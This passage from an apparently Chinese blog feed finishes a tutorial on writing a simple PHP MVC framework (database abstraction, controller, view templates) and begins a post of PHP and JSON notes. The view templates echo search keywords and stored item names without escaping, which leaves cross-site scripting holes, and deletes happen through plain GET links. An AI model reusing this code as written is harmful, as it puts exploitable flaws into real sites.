修改数据</span><br><span class="line">    public function update($data)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql = sprintf(&quot;update `%s` set %s %s&quot;, $this-&gt;table, $this-&gt;formatUpdate($data), $this-&gt;filter);</span><br><span class="line">        $sth = Db::pdo()-&gt;prepare($sql);</span><br><span class="line">        $sth = $this-&gt;formatParam($sth, $data);</span><br><span class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</span><br><span class="line">        $sth-&gt;execute();</span><br><span class="line"></span><br><span class="line">        return $sth-&gt;rowCount();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 占位符绑定具体的变量值</span><br><span class="line">     * @param PDOStatement $sth 要绑定的PDOStatement对象</span><br><span class="line">     * @param array $params 参数，有三种类型：</span><br><span class="line">     * 1）如果SQL语句用问号?占位符，那么$params应该为</span><br><span class="line">     *    [$a, $b, $c]</span><br><span class="line">     * 2）如果SQL语句用冒号:占位符，那么$params应该为</span><br><span class="line">     *    [&apos;a&apos; =&gt; $a, &apos;b&apos; =&gt; $b, &apos;c&apos; =&gt; $c]</span><br><span class="line">     *    或者</span><br><span class="line">     *    [&apos;:a&apos; =&gt; $a, &apos;:b&apos; =&gt; $b, &apos;:c&apos; =&gt; $c]</span><br><span class="line">     *</span><br><span class="line">     * @return PDOStatement</span><br><span class="line">     */</span><br><span class="line">    public function formatParam(PDOStatement $sth, $params = array())</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($params as $param =&gt; &amp;$value) &#123;</span><br><span class="line">            $param = is_int($param) ? $param + 1 : &apos;:&apos; . ltrim($param, &apos;:&apos;);</span><br><span class="line">            $sth-&gt;bindParam($param, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $sth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将数组转换成插入格式的sql语句</span><br><span class="line">    private function formatInsert($data)</span><br><span class="line">    &#123;</span><br><span class="line">        $fields = array();</span><br><span class="line">        $names = array();</span><br><span class="line">        foreach ($data as $key =&gt; $value) &#123;</span><br><span class="line">            $fields[] = sprintf(&quot;`%s`&quot;, $key);</span><br><span class="line">            $names[] = sprintf(&quot;:%s&quot;, $key);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $field = implode(&apos;,&apos;, $fields);</span><br><span class="line">        $name = implode(&apos;,&apos;, $names);</span><br><span class="line"></span><br><span class="line">        return sprintf(&quot;(%s) values (%s)&quot;, $field, $name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将数组转换成更新格式的sql语句</span><br><span class="line">    private function formatUpdate($data)</span><br><span class="line">    &#123;</span><br><span class="line">        $fields = array();</span><br><span class="line">        foreach ($data as $key =&gt; $value) &#123;</span><br><span class="line">            $fields[] = sprintf(&quot;`%s` = :%s&quot;, $key, $key);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return implode(&apos;,&apos;, $fields);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>应该说，Sql.php 是框架的核心部分。为什么？因为通过它，我们创建了一个 SQL 抽象层，可以大大减少了数据库的编程工作。虽然 PDO 接口本来已经很简洁，但是抽象之后框架的可灵活性更高。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 数据库操作类，$pdo属性为静态属性，这样在页面执行周期内，</span><br><span class="line"> * 只要经过一次赋值，那么第二次再获取还是首次赋值的内容，这</span><br><span class="line"> * 里就是PDO对象，这样可以确保运行期间只有一个数据库连接对</span><br><span class="line"> * 像，这种是一种简单的单例模式</span><br><span class="line"> * Class Db</span><br><span class="line"> */</span><br><span class="line">class Db</span><br><span class="line">&#123;</span><br><span class="line">    private static $pdo = null;</span><br><span class="line"></span><br><span class="line">    public static function pdo()</span><br><span class="line">    &#123;</span><br><span class="line">        if (self::$pdo !== null) &#123;</span><br><span class="line">            return self::$pdo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $dsn = sprintf(&apos;mysql:host=%s;dbname=%s&apos;, DB_HOST, DB_NAME);</span><br><span class="line">        $option = array(PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC);</span><br><span class="line"></span><br><span class="line">        return self::$pdo = new PDO($dsn, DB_USER, DB_PASS, $option);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="视图view类">视图View类</span></h3><p>视图类 View.php 内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * 视图基类</span><br><span class="line"> */</span><br><span class="line">class View</span><br><span class="line">&#123;</span><br><span class="line">    protected $variables = array();</span><br><span class="line">    protected $_controller;</span><br><span class="line">    protected $_action;</span><br><span class="line"></span><br><span class="line">    function __construct($controller, $action)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_controller = strtolower($controller);</span><br><span class="line">        $this-&gt;_action = strtolower($action);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 分配变量</span><br><span class="line">    public function assign($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;variables[$name] = $value;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 渲染显示</span><br><span class="line">    public function render()</span><br><span class="line">    &#123;</span><br><span class="line">        extract($this-&gt;variables);</span><br><span class="line">        $defaultHeader = APP_PATH . &apos;application/views/header.php&apos;;</span><br><span class="line">        $defaultFooter = APP_PATH . &apos;application/views/footer.php&apos;;</span><br><span class="line"></span><br><span class="line">        $controllerHeader = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/header.php&apos;;</span><br><span class="line">        $controllerFooter = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/footer.php&apos;;</span><br><span class="line">        $controllerLayout = APP_PATH . &apos;application/views/&apos; . $this-&gt;_controller . &apos;/&apos; . $this-&gt;_action . &apos;.php&apos;;</span><br><span class="line"></span><br><span class="line">        // 页头文件</span><br><span class="line">        if (file_exists($controllerHeader)) &#123;</span><br><span class="line">            include ($controllerHeader);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            include ($defaultHeader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //判断视图文件是否存在</span><br><span class="line">        if (file_exists($controllerLayout)) &#123;</span><br><span class="line">            include ($controllerLayout);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;h1&gt;无法找到视图文件&lt;/h1&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 页脚文件</span><br><span class="line">        if (file_exists($controllerFooter)) &#123;</span><br><span class="line">            include ($controllerFooter);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            include ($defaultFooter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们的核心的PHP MVC框架就编写完成了，下面我们开始编写应用来测试框架功能。</p>
<h2><span id="应用">应用</span></h2><h3><span id="数据库部署">数据库部署</span></h3><p>在 SQL 中新建一个 mydb 数据库，使用下面的语句增加 item 数据表并插入2条记录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE ` mydb ` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br><span class="line">USE ` mydb `;</span><br><span class="line">CREATE TABLE `item` (</span><br><span class="line">    `id` int(11) NOT NULL auto_increment,</span><br><span class="line">    `item_name` varchar(255) NOT NULL,</span><br><span class="line">    PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;</span><br><span class="line">INSERT INTO `item` VALUES(1, &apos;Hello World.&apos;);</span><br><span class="line">INSERT INTO `item` VALUES(2, &apos;Lets go!&apos;);</span><br></pre></td></tr></table></figure>
<h3><span id="部署模型">部署模型</span></h3><p> models 目录中创建一个 ItemModel.php 模型，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 用户Model</span><br><span class="line"> */</span><br><span class="line">class ItemModel extends Model</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * 自定义当前模型操作的数据库表名称，</span><br><span class="line">     * 如果不指定，默认为类名称的小写字符串，</span><br><span class="line">     * 这里就是 item 表</span><br><span class="line">     * @var string</span><br><span class="line">     */</span><br><span class="line">    protected $table = &apos;item&apos;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 搜索功能，因为Sql父类里面没有现成的like搜索，</span><br><span class="line">     * 所以需要自己写SQL语句，对数据库的操作应该都放</span><br><span class="line">     * 在Model里面，然后提供给Controller直接调用</span><br><span class="line">     * @param $title string 查询的关键词</span><br><span class="line">     * @return array 返回的数据</span><br><span class="line">     */</span><br><span class="line">    public function search($keyword)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql = &quot;select * from `$this-&gt;table` where `item_name` like :keyword&quot;;</span><br><span class="line">        $sth = Db::pdo()-&gt;prepare($sql);</span><br><span class="line">        $sth = $this-&gt;formatParam($sth, [&apos;:keyword&apos; =&gt; &quot;%$keyword%&quot;]);</span><br><span class="line">        $sth-&gt;execute();</span><br><span class="line"></span><br><span class="line">        return $sth-&gt;fetchAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>模型内容为空。因为 Item 模型继承了 Model，所以它拥有 Model 的所有功能。</p>
<h3><span id="部署控制器">部署控制器</span></h3><p>在 controllers 目录下创建一个 ItemController.php 控制器，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class ItemController extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    // 首页方法，测试框架自定义DB查询</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $keyword = isset($_GET[&apos;keyword&apos;]) ? $_GET[&apos;keyword&apos;] : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">        if ($keyword) &#123;</span><br><span class="line">            $items = (new ItemModel())-&gt;search($keyword);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 查询所有内容，并按倒序排列输出</span><br><span class="line">            // where()方法可不传入参数，或者省略</span><br><span class="line">            $items = (new ItemModel)-&gt;where()-&gt;order([&apos;id DESC&apos;])-&gt;fetchAll();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;assign(&apos;title&apos;, &apos;全部条目&apos;);</span><br><span class="line">        $this-&gt;assign(&apos;keyword&apos;, $keyword);</span><br><span class="line">        $this-&gt;assign(&apos;items&apos;, $items);</span><br><span class="line">        $this-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查看单条记录详情</span><br><span class="line">    public function detail($id)</span><br><span class="line">    &#123;</span><br><span class="line">        // 通过?占位符传入$id参数</span><br><span class="line">        $item = (new ItemModel())-&gt;where([&quot;id = ?&quot;], [$id])-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        $this-&gt;assign(&apos;title&apos;, &apos;条目详情&apos;);</span><br><span class="line">        $this-&gt;assign(&apos;item&apos;, $item);</span><br><span class="line">        $this-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 添加记录，测试框架DB记录创建（Create）</span><br><span class="line">    public function add()</span><br><span class="line">    &#123;</span><br><span class="line">        $data[&apos;item_name&apos;] = $_POST[&apos;value&apos;];</span><br><span class="line">        $count = (new ItemModel)-&gt;add($data);</span><br><span class="line"></span><br><span class="line">        $this-&gt;assign(&apos;title&apos;, &apos;添加成功&apos;);</span><br><span class="line">        $this-&gt;assign(&apos;count&apos;, $count);</span><br><span class="line">        $this-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 操作管理</span><br><span class="line">    public function manage($id = 0)</span><br><span class="line">    &#123;</span><br><span class="line">        $item = array();</span><br><span class="line">        if ($id) &#123;</span><br><span class="line">            // 通过名称占位符传入参数</span><br><span class="line">            $item = (new ItemModel())-&gt;where([&quot;id = :id&quot;], [&apos;:id&apos; =&gt; $id])-&gt;fetch();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;assign(&apos;title&apos;, &apos;管理条目&apos;);</span><br><span class="line">        $this-&gt;assign(&apos;item&apos;, $item);</span><br><span class="line">        $this-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 更新记录，测试框架DB记录更新（Update）</span><br><span class="line">    public function update()</span><br><span class="line">    &#123;</span><br><span class="line">        $data = array(&apos;id&apos; =&gt; $_POST[&apos;id&apos;], &apos;item_name&apos; =&gt; $_POST[&apos;value&apos;]);</span><br><span class="line">        $count = (new ItemModel)-&gt;where([&apos;id = :id&apos;], [&apos;:id&apos; =&gt; $data[&apos;id&apos;]])-&gt;update($data);</span><br><span class="line"></span><br><span class="line">        $this-&gt;assign(&apos;title&apos;, &apos;修改成功&apos;);</span><br><span class="line">        $this-&gt;assign(&apos;count&apos;, $count);</span><br><span class="line">        $this-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 删除记录，测试框架DB记录删除（Delete）</span><br><span class="line">    public function delete($id = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $count = (new ItemModel)-&gt;delete($id);</span><br><span class="line"></span><br><span class="line">        $this-&gt;assign(&apos;title&apos;, &apos;删除成功&apos;);</span><br><span class="line">        $this-&gt;assign(&apos;count&apos;, $count);</span><br><span class="line">        $this-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="部署视图">部署视图</span></h3><p>在 views 目录下新建 header.php 和 footer.php 两个页头页脚模板，内容如下。</p>
<p>header.php，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;&lt;?php echo $title ?&gt;&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; type=&quot;text/css&quot; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;&lt;?php echo $title ?&gt;&lt;/h1&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后，在 views/item 创建以下几个视图文件。<br>index.php，浏览数据库内 item 表的所有记录，内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; value=&quot;&lt;?php echo $keyword ?&gt;&quot; name=&quot;keyword&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;a href=&quot;/item/manage&quot;&gt;新建&lt;/a&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;ID&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;内容&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;?php foreach ($items as $item): ?&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;?php echo $item[&apos;id&apos;] ?&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;a href=&quot;/item/detail/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot; title=&quot;查看详情&quot;&gt;</span><br><span class="line">                    &lt;?php echo $item[&apos;item_name&apos;] ?&gt;</span><br><span class="line">                &lt;/a&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;a href=&quot;/item/manage/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;编辑&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;/item/delete/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;删除&lt;/a&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;?php endforeach ?&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
<p>add.php，添加记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;成功添加&lt;?php echo $count ?&gt;条记录，点击返回&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>delete.php，删除记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;/item/index&quot;&gt;成功删除&lt;?php echo $count ?&gt;项，点击返回&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>update.php 更新记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;成功修改&lt;?php echo $count ?&gt;项，点击返回&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>manage.php 编辑记录，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form  &lt;?php if (isset($item[&apos;id&apos;])) &#123; ?&gt;</span><br><span class="line">            action=&quot;/item/update/&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;</span><br><span class="line">        &lt;?php &#125; else &#123; ?&gt;</span><br><span class="line">            action=&quot;/item/add&quot;</span><br><span class="line">        &lt;?php &#125; ?&gt;</span><br><span class="line">      method=&quot;post&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php if (isset($item[&apos;id&apos;])): ?&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&lt;?php echo $item[&apos;id&apos;] ?&gt;&quot;&gt;</span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;value&quot; value=&quot;&lt;?php echo isset($item[&apos;item_name&apos;]) ? $item[&apos;item_name&apos;] : &apos;&apos; ?&gt;&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;返回&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>detail.php 显示记录，内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID：&lt;?php echo $item[&apos;id&apos;] ?&gt;&lt;br /&gt;</span><br><span class="line">Name：&lt;?php echo isset($item[&apos;item_name&apos;]) ? $item[&apos;item_name&apos;] : &apos;&apos; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;a class=&quot;big&quot; href=&quot;/item/index&quot;&gt;返回&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="应用测试">应用测试</span></h2><p>直接访问　<a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mvc2.png" alt=""></p>
<h2><span id="github-links">Github Links</span></h2><p><a href="https://github.com/uknowsec/myphp-frame" target="_blank" rel="noopener">Github myphp-frame</a></p>
<h2><span id="reference">Reference</span></h2><p><a href="http://www.cnblogs.com/Steven-shi/p/5914175.html" target="_blank" rel="noopener">编写自己的PHP MVC框架笔记</a><br><a href="https://www.awaimai.com/128.html" target="_blank" rel="noopener">手把手编写PHP MVC框架实例教程</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP&JSON 学习笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/PHP-JSON-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="json介绍">JSON介绍</span></h2><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式</p>
<h3><span id="json格式">JSON格式</span></h3><ul>
<li>1） 并列的数据之间用逗号（”, “）分隔。</li>
<li>2） 映射用冒号（”: “）表示。</li>
<li>3） 并列数据的集合（数组）用方括号(“[]”)表示。</li>
<li>4） 映射的集合（对象）用大括号（”{}”）表示</li>
</ul>
<h2><span id="phpampjson">PHP&amp;JSON</span></h2><h3><span id="json函数">JSON函数</span></h3><table>
<thead>
<tr>
<th>函数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>json_encode</td>
<td style="text-align:center">对变量进行 JSON 编码</td>
</tr>
<tr>
<td>json_decode</td>
<td style="text-align:center">对 JSON 格式的字符串进行解码，转换为 PHP 变量</td>
</tr>
</tbody>
</table>
<h4><span id="json_encode">json_encode</span></h4><p>PHP json_encode() 用于对变量进行 JSON 编码，该函数如果执行成功返回 JSON 数据，否则返回 FALSE 。</p>
<h5><span id="语法">语法</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string json_encode ( $value [, $options = 0 ] )</span><br></pre></td></tr></table></figure>
<h5><span id="参数">参数</span></h5><ul>
<li>value: 要编码的值。该函数只对 UTF-8 编码的数据有效。</li>
<li>options:由以下常量组成的二进制掩码：JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_NUMERIC_CHECK,JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT</li>
</ul>
<h5><span id="实例">实例</span></h5><p>以下实例演示了如何将 PHP 数组转换为 JSON 格式数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2, &apos;c&apos; =&gt; 3, &apos;d&apos; =&gt; 4, &apos;e&apos; =&gt; 5);</span><br><span class="line">   echo json_encode($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>以上代码执行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</span><br></pre></td></tr></table></figure>
